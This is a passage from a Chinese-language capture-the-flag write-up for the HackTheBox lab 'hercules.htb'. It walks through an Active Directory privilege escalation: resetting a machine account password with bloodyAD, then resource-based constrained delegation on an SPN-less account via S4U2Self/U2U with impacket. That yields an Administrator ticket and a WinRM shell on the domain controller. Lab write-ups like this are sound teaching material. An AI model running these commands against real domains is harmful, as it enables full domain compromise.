![image-20251105140631212](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105140637942-2012088287.png)

**下面就要改`IIS_WEBSERVER$`的密码了**

请求`iis_administrator`的`TGT`

````shell
impacket-getTGT 'hercules.htb'/'iis_administrator':'Aa123456!' -dc-ip 10.10.11.91
````

![image-20251105141131075](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105141137422-2046362001.png)

导入票据

```shell
export KRB5CCNAME=iis_administrator.ccache
```

修改密码

```shell
bloodyAD --host dc.hercules.htb -d hercules.htb  -u 'iis_administrator' -k set password 'iis_webserver$' 'Aa123456!'
```

![image-20251105141419999](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105141426274-1649877997.png)

# RBCD+S4U2Self滥用

![image-20251106103347102](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106103358423-1865802517.png)

在`bloodhound`中发现`iis_webserver$`对`iis_webserver$`有`AllowedToAct`

> 这个权限大概的意思是：IIS_WEBSERVER$  →  可以冒充任何人  →  访问 DC 的任何服务（cifs、ldap、host、rpcss...）
>
> 但是需要注意的是正常打的话，会产生一个报错
>
> `[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)`
> `[-] Probably user IIS_WEBSERVER$ does not have constrained delegation permisions or impersonated user does not exist`
>
> 原因是找不到spn，所以我们要找无SPN 的打法
>
> [参考](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd?utm_source=chatgpt.com#rbcd-on-spn-less-users)

按照顺序执行命令即可

请求TGT：

```shell
impacket-getTGT -hashes :$(pypykatz crypto nt 'Aa123456!') 'hercules.htb/iis_webserver$'
```

![image-20251106110519601](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106110527869-266966559.png)

```shell
impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key'
```

![image-20251106110658628](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106110706934-1284446919.png)

```hash
[*] Ticket Session Key            : 6a36fd9aef24ea729f1064972bfec7fa
```

```shell
export KRB5CCNAME=iis_webserver$.ccache
impacket-changepasswd -k -newhashes :6a36fd9aef24ea729f1064972bfec7fa 'hercules.htb/iis_webserver$':'Aa123456!'@'dc.hercules.htb'
```

![image-20251106111329270](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106111337565-1897002886.png)

```shell
impacket-getST -u2u -impersonate "Administrator" -spn "host/dc.hercules.htb" -k -no-pass 'hercules.htb/iis_webserver$'
```

![image-20251106111440645](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106111448865-1646205756.png)

导入票据登录

```shell
export KRB5CCNAME=Administrator@host_dc.hercules.htb@HERCULES.HTB.ccache
python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

![image-20251106111806802](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106111815604-1005363222.png)

在`C:\Users\Admin\Desktop`找到`root.txt`

